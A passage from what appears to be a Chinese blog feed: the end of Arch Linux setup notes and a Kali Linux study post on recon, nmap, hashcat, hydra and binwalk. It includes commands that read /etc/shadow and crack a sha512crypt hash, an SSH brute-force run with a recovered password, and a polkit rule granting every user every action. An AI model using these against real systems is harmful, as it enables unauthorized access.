<li>使用x11vnc，具体看 <a href="/blogs/2018-09-16-shellStudy/#8-2-x11vnc-linux%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2">x11vnc linux远程桌面</a></li>
</ul>
<h4 id="2-类似windows远程桌面，远程操作，本地看不到"><a href="#2-类似windows远程桌面，远程操作，本地看不到" class="headerlink" title="2) 类似windows远程桌面，远程操作，本地看不到"></a>2) 类似windows远程桌面，远程操作，本地看不到</h4><ul>
<li>需要使用lightdm桌面管理器</li>
<li>安装</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy lightdm lightdm-gtk-greeter tigervnc</span><br></pre></td></tr></table></figure>

<ul>
<li>配置vnc密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vncpasswd /etc/vncpasswd</span><br></pre></td></tr></table></figure>

<ul>
<li>配置lightdm，编辑<code>/etc/lightdm/lightdm.conf</code>，最后几行开启</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[VNCServer]</span><br><span class="line">enabled=true</span><br><span class="line">command=Xvnc -rfbauth /etc/vncpasswd</span><br><span class="line">port=5900</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">listen-address=</span></span><br><span class="line">width=1920</span><br><span class="line">height=1080</span><br><span class="line">depth=32</span><br></pre></td></tr></table></figure>

<ul>
<li>启动lightdm即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart lightdm</span><br></pre></td></tr></table></figure>

<p><strong>vnc连上后总是提示<code>system policy prevents control of network connections</code></strong></p>
<ul>
<li>编辑系统策略配置文件<code>/etc/polkit-1/localauthority/50-local.d/universal.pkla</code></li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Allow VNC for all users]</span></span><br><span class="line"><span class="attr">Identity</span>=unix-user:*</span><br><span class="line"><span class="attr">Action</span>=*</span><br><span class="line"><span class="attr">ResultAny</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">ResultInactive</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">ResultActive</span>=<span class="literal">yes</span></span><br></pre></td></tr></table></figure>

<ul>
<li>重启服务即可<code>sudo systemctl restart polkit.service</code></li>
</ul>
<h2 id="2-命令行工具"><a href="#2-命令行工具" class="headerlink" title="2. 命令行工具"></a>2. 命令行工具</h2><h3 id="2-1-mysql"><a href="#2-1-mysql" class="headerlink" title="2.1. mysql"></a>2.1. mysql</h3><h4 id="1-安装-3"><a href="#1-安装-3" class="headerlink" title="(1) 安装"></a>(1) 安装</h4><ul>
<li>archlinux中安装mysql需要安装mariadb包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy mariadb</span><br></pre></td></tr></table></figure>

<h4 id="2-配置"><a href="#2-配置" class="headerlink" title="(2) 配置"></a>(2) 配置</h4><ol>
<li>要先执行下面命令配置mysql</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>新建用户，首次需要使用管理员权限登陆root帐号，密码为空</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mysql -u root -p</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;xxx&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;xxxx&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.034</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;xxx&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.023</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> FLUSH PRIVILEGES;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> exit;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用新用户登陆，开始你的表演</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u xxx -p</span><br></pre></td></tr></table></figure>

<h3 id="2-2-gvim"><a href="#2-2-gvim" class="headerlink" title="2.2. gvim"></a>2.2. gvim</h3><ul>
<li>默认的vim不包含剪贴板相关功能，使用gvim可以包含此功能</li>
</ul>
<h2 id="3-vmware"><a href="#3-vmware" class="headerlink" title="3. vmware"></a>3. vmware</h2><h3 id="3-1-网络和usb"><a href="#3-1-网络和usb" class="headerlink" title="3.1. 网络和usb"></a>3.1. 网络和usb</h3><ul>
<li>vmware启动前需要启动两个服务，不然无法联网和usb映射</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start vmware-networks.service</span><br><span class="line">sudo systemctl start vmware-usbarbitrator.service</span><br></pre></td></tr></table></figure>

<h2 id="4-xfce4-桌面"><a href="#4-xfce4-桌面" class="headerlink" title="4. xfce4 桌面"></a>4. xfce4 桌面</h2><h3 id="4-1-有线无线网络管理"><a href="#4-1-有线无线网络管理" class="headerlink" title="4.1. 有线无线网络管理"></a>4.1. 有线无线网络管理</h3><ul>
<li>需要安装<code>network-manager-applet</code></li>
</ul>
<h1 id="四、makepkg"><a href="#四、makepkg" class="headerlink" title="四、makepkg"></a>四、makepkg</h1><h2 id="1-编译内核"><a href="#1-编译内核" class="headerlink" title="1. 编译内核"></a>1. 编译内核</h2><h3 id="1-1-目录结构"><a href="#1-1-目录结构" class="headerlink" title="1.1. 目录结构"></a>1.1. 目录结构</h3><ul>
<li>内核代码拉下来后，可以看到目录如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; tree -L 2</span><br><span class="line">.</span><br><span class="line">├── repos</span><br><span class="line">│   ├── core-i686</span><br><span class="line">│   ├── core-x86_64</span><br><span class="line">│   └── testing-x86_64</span><br><span class="line">└── trunk</span><br><span class="line">    ├── archlinux-linux</span><br><span class="line">    ├── config</span><br><span class="line">    ├── keys</span><br><span class="line">    ├── pkg</span><br><span class="line">    ├── PKGBUILD</span><br><span class="line">    └── src</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-2-编译技巧"><a href="#1-2-编译技巧" class="headerlink" title="1.2. 编译技巧"></a>1.2. 编译技巧</h3><ul>
<li>内核配置在<code>trunk/config</code>，代码在<code>trunk/archlinux-linux</code>，实际编译的代码目录<code>trunk/src/archlinux-linux</code></li>
<li>可以在代码目录下修改config之后保存在外层的config下</li>
<li>PKGBUILD中会将config拷贝到<code>trunk/src/archlinux-linux</code>目录下的<code>.config</code>进行编译</li>
<li>修改<code>PKGBUILD</code>，找到<code>make htmldocs all</code>，这个是编译命令，可以添加<code>-j 16</code>加速编译</li>
<li>编译直接在<code>trunk</code>目录下执行下面的命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-s 安装依赖</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f 覆盖编译</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--skipinteg 跳过完整性检查，因为改了config这个会不过，所以要跳过</span></span><br><span class="line">makepkg -sf --skipinteg</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记和小技巧"><a href="#踩坑记和小技巧" class="headerlink" title="踩坑记和小技巧"></a>踩坑记和小技巧</h1><h2 id="1-安装-kde-桌面后，发现特别卡慢"><a href="#1-安装-kde-桌面后，发现特别卡慢" class="headerlink" title="1. 安装 kde 桌面后，发现特别卡慢"></a>1. 安装 kde 桌面后，发现特别卡慢</h2><ul>
<li>原因是 baloo_file_extractor 这个进程占用太多的磁盘 io，导致特别卡</li>
<li>解决方法是执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">balooctl disable</span><br></pre></td></tr></table></figure>

<h2 id="2-安装vscode之后，登陆github提示writing-login-information-to-keychain-failed"><a href="#2-安装vscode之后，登陆github提示writing-login-information-to-keychain-failed" class="headerlink" title="2. 安装vscode之后，登陆github提示writing login information to keychain failed"></a>2. 安装vscode之后，登陆github提示<code>writing login information to keychain failed</code></h2><ul>
<li>由于arch安装的vscode使用的是ubuntu的包，所以keyring需要使用<code>gnome-keyring</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gnome-keyring</span><br></pre></td></tr></table></figure>

<h2 id="3-etc-sysctl-conf重启后没有自动加载"><a href="#3-etc-sysctl-conf重启后没有自动加载" class="headerlink" title="3. /etc/sysctl.conf重启后没有自动加载"></a>3. <code>/etc/sysctl.conf</code>重启后没有自动加载</h2><ul>
<li>arch将<code>sysctl.conf</code>分到了<code>/etc/sysctl.d/*.conf</code>下，需要移动进去</li>
<li>具体说明见<code>man sysctl.d</code></li>
</ul>
<h2 id="4-挂载ntfs磁盘分区仅能使用只读"><a href="#4-挂载ntfs磁盘分区仅能使用只读" class="headerlink" title="4. 挂载ntfs磁盘分区仅能使用只读"></a>4. 挂载ntfs磁盘分区仅能使用只读</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ntfsfix /dev/sdb4</span><br><span class="line">sudo umount /dev/sdb4</span><br><span class="line">sudo mount /dev/sdb4 /path/to/mount</span><br></pre></td></tr></table></figure>

<h2 id="5-安装提示bsdtar-Option-no-read-sparse-is-not-supported"><a href="#5-安装提示bsdtar-Option-no-read-sparse-is-not-supported" class="headerlink" title="5. 安装提示bsdtar: Option --no-read-sparse is not supported"></a>5. 安装提示<code>bsdtar: Option --no-read-sparse is not supported</code></h2><ul>
<li>把conda退了就好了，应该是conda的环境跟bsdtar冲突了</li>
</ul>
<h2 id="6-安装提示error-missing-package-metadata-in-xxx"><a href="#6-安装提示error-missing-package-metadata-in-xxx" class="headerlink" title="6. 安装提示error: missing package metadata in xxx"></a>6. 安装提示<code>error: missing package metadata in xxx</code></h2><ul>
<li>此问题是因为cache目录存在脏数据，使用<code>yay -Scc</code>清理一下就好了</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kali linux攻防学习</title>
    <url>/blogs/2021-03-22-kali/</url>
    <content><![CDATA[<h1 id="一、被动信息收集"><a href="#一、被动信息收集" class="headerlink" title="一、被动信息收集"></a>一、被动信息收集</h1><h2 id="1-dns域名解析信息收集"><a href="#1-dns域名解析信息收集" class="headerlink" title="1. dns域名解析信息收集"></a>1. dns域名解析信息收集</h2><h3 id="1-1-dns域名解析原理"><a href="#1-1-dns域名解析原理" class="headerlink" title="1.1. dns域名解析原理"></a>1.1. dns域名解析原理</h3><p><strong>域名服务器</strong></p>
<ul>
<li>dns服务器分为根域dns服务器和顶级域名服务器</li>
<li>根域dns服务器一般有13个，储存了所有顶级域名服务器的地址</li>
<li>顶级域名服务器储存了每位客户所注册的主机地址</li>
</ul>
<p><strong>域名记录</strong></p>
<ul>
<li>A: 正向解析，一个域名对应一个IP地址</li>
<li>Cname: 别名，允许多个域名对应一个主机</li>
<li>NS: 域名服务器记录，用于指定该域名由那个域名服务器解析</li>
<li>MX: 邮件交换记录，通过<code>@xxx.xxx</code>来对应邮件服务器</li>
<li>PTR: 反向解析，通过IP查域名，记录保存在<code>in-addr.arpa</code>域中</li>
</ul>
<p><strong>dns缓存服务器</strong></p>
<ul>
<li>不负责解析，只用来缓存结果</li>
</ul>
<p><strong>dns域名解析过程</strong></p>
<img src = "2021-03-22-01.png">

<h3 id="1-2-dns解析命令"><a href="#1-2-dns解析命令" class="headerlink" title="1.2. dns解析命令"></a>1.2. dns解析命令</h3><ol>
<li>ping</li>
<li>nslookup</li>
<li>dig</li>
</ol>
<p><strong>nslookup</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="二、wireShark使用"><a href="#二、wireShark使用" class="headerlink" title="二、wireShark使用"></a>二、wireShark使用</h1><h2 id="2-抓包技巧"><a href="#2-抓包技巧" class="headerlink" title="2. 抓包技巧"></a>2. 抓包技巧</h2><h3 id="2-1-过滤器使用"><a href="#2-1-过滤器使用" class="headerlink" title="2.1. 过滤器使用"></a>2.1. 过滤器使用</h3><p><strong>一些基本使用</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##### 过滤ip ######</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所有ip</span></span><br><span class="line">ip.addr == 1.1.1.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目标和来源</span></span><br><span class="line">ip.src_host == 1.1.1.1</span><br><span class="line">ip.dst_host == 1.1.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##### 协议 ######</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">协议直接打协议名，tcp/udp/icmp/arp/http等</span></span><br><span class="line">tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##### 逻辑 ######</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与和或</span></span><br><span class="line">ip.src_host == 1.1.1.1 or ip.dst_host == 1.1.1.1</span><br><span class="line">ip.src_host == 1.1.1.1 and ip.dst_host == 1.1.1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="三、一些好用的命令"><a href="#三、一些好用的命令" class="headerlink" title="三、一些好用的命令"></a>三、一些好用的命令</h1><h2 id="1-namp"><a href="#1-namp" class="headerlink" title="1. namp"></a>1. namp</h2><h3 id="1-1-选项"><a href="#1-1-选项" class="headerlink" title="1.1. 选项"></a>1.1. 选项</h3><ul>
<li><code>-v</code>: 显示详细信息</li>
<li><code>-p &lt;port&gt;</code>: 指定端口范围，例：<code>1-100,135,199,1234</code></li>
<li><code>-O</code>: 显示操作系统类型</li>
<li><code>-A</code>: 对操作系统和软件版本号进行探测，并进行traceroute路由探测</li>
<li><code>-T&lt;0-5&gt;</code>: 扫描过程中使用的时序，级别越高扫描速度越快，但容易被防火墙或IDS检测屏蔽，推荐使用T4</li>
<li><code>--randomize-host</code>: 对目标主机顺序随机划分</li>
<li><code>--scan-delay &lt;time&gt;</code>: 探针之间的延迟，单位s，可以指定，例：<code>3000ms</code></li>
<li><code>-F</code>: 快速模式</li>
<li><code>--version-light</code>: 设定侦测等级为2</li>
</ul>
<p><strong>扫描类型</strong></p>
<ul>
<li><code>-sS</code>: TCP同步扫描（SYN），半开扫描，只发送sync包，如果回了syn|ack就说明端口开放</li>
<li><code>-sn</code>: ping扫描</li>
<li><code>-sV</code>: 探测端口及服务版本信息</li>
</ul>
<h3 id="1-2-实例"><a href="#1-2-实例" class="headerlink" title="1.2. 实例"></a>1.2. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描网段</span></span><br><span class="line">=&gt; nmap -sS -O 192.168.1.0/24</span><br><span class="line">=&gt; nmap -sS -O 1.*.2.3-8</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描单个ip</span></span><br><span class="line">=&gt; nmap -sS -O 192.168.1.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描域名</span></span><br><span class="line">=&gt; nmap -sS -O www.baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="2-hashcat"><a href="#2-hashcat" class="headerlink" title="2. hashcat"></a>2. hashcat</h2><ul>
<li>用来破解hash值，解出原文</li>
<li>在线解密网站: <a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...</span><br></pre></td></tr></table></figure>

<h3 id="2-1-选项解释"><a href="#2-1-选项解释" class="headerlink" title="2.1. 选项解释"></a>2.1. 选项解释</h3><ul>
<li><code>-m [algorithm_code]</code>: 算法指定，下面列举几个常用的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">900 md4加密算法</span><br><span class="line">0   md5加密算法</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-a [attack_mode]</code>: 破解模式</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">| Mode</span></span><br><span class="line">===+======</span><br><span class="line"> 0 | Straight                # 字典破解 指定字典文件进行破解</span><br><span class="line"> 1 | Combination             # 组合破解</span><br><span class="line"> 3 | Brute-force             # 掩码暴力破解 给定掩码，暴力枚举来破解密码</span><br><span class="line"> 6 | Hybrid Wordlist + Mask  # 字典+掩码破解</span><br><span class="line"> 7 | Hybrid Mask + Wordlist  # 掩码+字典破解</span><br><span class="line"> 9 | Association             #</span><br></pre></td></tr></table></figure>

<h4 id="1-掩码格式"><a href="#1-掩码格式" class="headerlink" title="1) 掩码格式"></a>1) 掩码格式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- [ Built-in Charsets ] -</span><br><span class="line"></span><br><span class="line">  ? | Charset</span><br><span class="line"> ===+=========</span><br><span class="line">  l | abcdefghijklmnopqrstuvwxyz [a-z]</span><br><span class="line">  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]</span><br><span class="line">  d | 0123456789                 [0-9]</span><br><span class="line">  h | 0123456789abcdef           [0-9a-f]</span><br><span class="line">  H | 0123456789ABCDEF           [0-9A-F]</span><br><span class="line">  s |  !&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br><span class="line">  a | ?l?u?d?s</span><br><span class="line">  b | 0x00 - 0xff</span><br></pre></td></tr></table></figure>

<p><strong>示例用法</strong></p>
<ul>
<li><code>?a?a?a?a?a</code>: 5位数字大小写和特殊字符的组合</li>
<li><code>abc?l</code>: abc跟随一个a-z</li>
</ul>
<h3 id="2-2-示例用法"><a href="#2-2-示例用法" class="headerlink" title="2.2. 示例用法"></a>2.2. 示例用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-a 3 使用掩码破解</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">?a?a?a?a?a 认为是5位数字大小写和特殊字符的组合</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-m 900 md4加密算法</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-m 0 md5加密算法</span></span><br><span class="line">hashcat -a 3 -m 900 45d5e0ff62cf31019d1c53d9f13f378a &#x27;?a?a?a?a?a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">已经解出来的，使用--show查看</span></span><br><span class="line">hashcat -a 3 -m 900 45d5e0ff62cf31019d1c53d9f13f378a &#x27;?a?a?a?a?a&#x27; --show</span><br></pre></td></tr></table></figure>

<h3 id="2-3-破解linux的shadow文件"><a href="#2-3-破解linux的shadow文件" class="headerlink" title="2.3. 破解linux的shadow文件"></a>2.3. 破解linux的shadow文件</h3><ul>
<li>先查看文件中的加密算法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; cat /etc/shadow | grep admin</span><br><span class="line">admin:$6$EzFzlOJKGd9kKCS8$SjbWh9P8M7UcJ5tJ0Ao5iiDuqfy57BZlJl5P9PSOnfaQJv9dSDEBxsYvWv8S0O4/akkt6WZ7gDMyXvYMF1Pvp/:19198:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看出是<code>$6$</code>的算法，那么在hashcat中找此算法对应1800</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; hashcat --help | grep &#x27;$6\$&#x27;</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System</span><br><span class="line">  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key</span><br></pre></td></tr></table></figure>

<ul>
<li>将上述的密文也就是用户名后面的一段到冒号，输出到另一个文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; cat /etc/shadow | grep &#x27;^admin&#x27; | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; &gt; pwd.hash</span><br><span class="line">=&gt; cat pwd.hash</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6$EzFzlOJKGd9kKCS8<span class="variable">$SjbWh9P8M7UcJ5tJ0Ao5iiDuqfy57BZlJl5P9PSOnfaQJv9dSDEBxsYvWv8S0O4</span>/akkt6WZ7gDMyXvYMF1Pvp/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>准备一份爆破字典</li>
<li>使用爆破字典，对应1800算法，爆破密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; hashcat -a 0 -m 1800 -o found.txt pwd.hash hashcat_wordlist.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>最终输出到<code>found.txt</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; cat found.txt</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6$EzFzlOJKGd9kKCS8<span class="variable">$SjbWh9P8M7UcJ5tJ0Ao5iiDuqfy57BZlJl5P9PSOnfaQJv9dSDEBxsYvWv8S0O4</span>/akkt6WZ7gDMyXvYMF1Pvp/:sangfortool</span></span><br></pre></td></tr></table></figure>

<h2 id="3-hydra-爆破登陆"><a href="#3-hydra-爆破登陆" class="headerlink" title="3. hydra 爆破登陆"></a>3. hydra 爆破登陆</h2><h3 id="3-1-ssh爆破"><a href="#3-1-ssh爆破" class="headerlink" title="3.1. ssh爆破"></a>3.1. ssh爆破</h3><ul>
<li>容易被封，小心点</li>
</ul>
<h4 id="1-示例用法"><a href="#1-示例用法" class="headerlink" title="1) 示例用法"></a>1) 示例用法</h4><ul>
<li><code>-l &lt;user&gt;</code>: 指定用户名</li>
<li><code>-L &lt;user.txt&gt;</code>: 指定一个用户名列表</li>
<li><code>-p &lt;passwd&gt;</code>: 指定密码</li>
<li><code>-P &lt;passwd.txt&gt;</code>: 指定一个密码列表</li>
<li><code>-t &lt;threadNum&gt;</code>: 几个线程进行爆破</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; hydra -l admin -P ~/work/src/local/hashcat_wordlist.txt -t 64 199.200.2.170 ssh</span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-14 10:38:49</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 56 tasks per 1 server, overall 56 tasks, 56 login tries (l:1/p:56), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://199.200.2.170:22/</span><br><span class="line">[22][ssh] host: 199.200.2.170   login: admin   password: test@123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-14 10:38:51</span><br></pre></td></tr></table></figure>

<h2 id="4-fping-ping探测"><a href="#4-fping-ping探测" class="headerlink" title="4. fping ping探测"></a>4. fping ping探测</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对 192.168.80.0/24 网段进行ping扫描，结果输出到a.txt</span></span><br><span class="line">fping -g 192.168.80.0/24 -c 1 &gt; a.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对 192.168.1.0-192.168.1.255 网段进行ping扫描，结果输出到a.txt</span></span><br><span class="line">fping -g 192.168.1.0 192.168.1.255 -c 1 &gt; a.txt</span><br></pre></td></tr></table></figure>

<h2 id="5-rar2john-rar压缩包密码获取"><a href="#5-rar2john-rar压缩包密码获取" class="headerlink" title="5. rar2john rar压缩包密码获取"></a>5. rar2john rar压缩包密码获取</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; rar2john test.rar</span><br><span class="line">Created directory: /root/.john</span><br><span class="line">test.rar:$rar5$16$1e71cb65fbc2e25d134279f2cb5be013$15$f6115d7dee842c1f8901b057e2bc8952$8$1988f3ce18017cdb</span><br></pre></td></tr></table></figure>

<ul>
<li>破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; hashcat -m 13000 -a 3 &#x27;$rar5$16$1e71cb65fbc2e25d134279f2cb5be013$15$f6115d7dee842c1f8901b057e2bc8952$8$1988f3ce18017cdb&#x27; &#x27;abc?l&#x27;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rar5$16$1e71cb65fbc2e25d134279f2cb5be013$15$f6115d7dee842c1f8901b057e2bc8952$8<span class="variable">$1988f3ce18017cdb</span>:abcd</span></span><br></pre></td></tr></table></figure>

<h2 id="6-binwalk-隐写文件"><a href="#6-binwalk-隐写文件" class="headerlink" title="6. binwalk 隐写文件"></a>6. binwalk 隐写文件</h2><h3 id="6-1-选项"><a href="#6-1-选项" class="headerlink" title="6.1. 选项"></a>6.1. 选项</h3><ul>
<li><code>-e</code>: 自动解压已知类型</li>
</ul>
<h3 id="6-2-示例用法"><a href="#6-2-示例用法" class="headerlink" title="6.2. 示例用法"></a>6.2. 示例用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件内容</span></span><br><span class="line">=&gt; binwalk mianju.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, EXIF standard</span><br><span class="line">12            0xC             TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line">478718        0x74DFE         Zip archive data, at least v2.0 to extract, compressed size: 153767, uncompressed size: 3145728, name: flag.vmdk</span><br><span class="line">632615        0x9A727         End of Zip archive, footer length: 22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压文件</span></span><br><span class="line">=&gt; binwalk -e ../mianju.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, EXIF standard</span><br><span class="line">12            0xC             TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">478718        0x74DFE         Zip archive data, at least v2.0 to extract, compressed size: 153767, uncompressed size: 3145728, name: flag.vmdk</span><br><span class="line">632615        0x9A727         End of Zip archive, footer length: 22</span><br><span class="line"></span><br><span class="line">=&gt; tree</span><br><span class="line">.</span><br><span class="line">└── _mianju.jpg.extracted</span><br><span class="line">    ├── 74DFE.zip</span><br><span class="line">    └── flag.vmdk</span><br><span class="line"></span><br><span class="line">2 directories, 2 files</span><br></pre></td></tr></table></figure>

<h1 id="四、Metasploiut-Framework"><a href="#四、Metasploiut-Framework" class="headerlink" title="四、Metasploiut Framework"></a>四、Metasploiut Framework</h1><h2 id="1-启动"><a href="#1-启动" class="headerlink" title="1. 启动"></a>1. 启动</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化数据库</span></span><br><span class="line">msf6 &gt; msfdb init</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可用模块</span></span><br><span class="line">use</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看模块详细信息</span></span><br><span class="line">info</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行模块</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h1 id="小技巧与踩坑记"><a href="#小技巧与踩坑记" class="headerlink" title="小技巧与踩坑记"></a>小技巧与踩坑记</h1><h2 id="1-apt-update-提示key问题"><a href="#1-apt-update-提示key问题" class="headerlink" title="1. apt update 提示key问题"></a>1. apt update 提示key问题</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget archive.kali.org/archive-key.asc</span><br><span class="line">sudo apt-key add archive-key.asc</span><br></pre></td></tr></table></figure>

